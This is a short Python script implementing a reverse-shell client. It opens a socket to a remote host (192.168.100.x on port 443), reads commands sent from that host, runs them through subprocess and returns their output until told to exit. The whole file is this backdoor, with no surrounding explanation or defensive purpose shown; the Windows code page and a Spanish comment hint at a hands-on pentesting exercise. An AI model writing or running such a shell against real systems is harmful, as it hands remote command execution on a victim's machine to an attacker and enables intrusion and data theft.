import socket
import subprocess

def run_command(command):

    command_output = subprocess.check_output(command)
    return command_output.decode("cp850")

if __name__ == '__main__':
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(("192.168.100.x", 443))

    try:
        while True:
            command = client_socket.recv(2048).decode().strip()
            if command.lower() in ["exit", "quit"]:
                break  # sale del bucle

            command_output = run_command(command)
            client_socket.send(b"\n" + command_output.encode() + b"\n\n")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_socket.close()
        print("[+] Socket closed")
